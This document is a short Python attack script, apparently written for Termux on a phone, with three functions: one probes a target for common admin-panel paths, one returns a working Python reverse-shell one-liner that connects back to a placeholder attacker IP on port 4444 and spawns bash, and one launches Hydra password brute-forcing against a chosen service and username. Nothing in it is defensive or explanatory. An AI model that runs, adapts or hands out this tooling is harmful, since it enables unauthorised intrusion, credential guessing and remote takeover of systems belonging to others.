import subprocess, os, requests

def find_admin_panels(url):
    print(f"[!] Searching for hidden admin pages on {url}...")
    # Common admin paths
    paths = ["admin", "login", "wp-admin", "superadmin", "control", "dashboard", "secret"]
    found = []
    for path in paths:
        try:
            full_url = f"http://{url}/{path}"
            r = requests.get(full_url, timeout=3)
            if r.status_code == 200:
                found.append(full_url)
        except: continue
    return found

def generate_reverse_shell():
    # A standard Python Reverse Shell for Linux/Android servers
    # Replace [YOUR_IP] with your actual phone IP
    return """
    python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect(("[YOUR_IP]",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
    """

def run_hydra(target, service, username):
    print(f"[!] Launching Hydra attack on {target} ({service})...")
    # This uses a basic internal wordlist for testing
    cmd = f"hydra -l {username} -P /data/data/com.termux/files/usr/share/hydra/diaspora.txt {service}://{target}"
    try:
        res = subprocess.getoutput(cmd)
        return res
    except:
        return "Hydra failed. Check if target service is active."
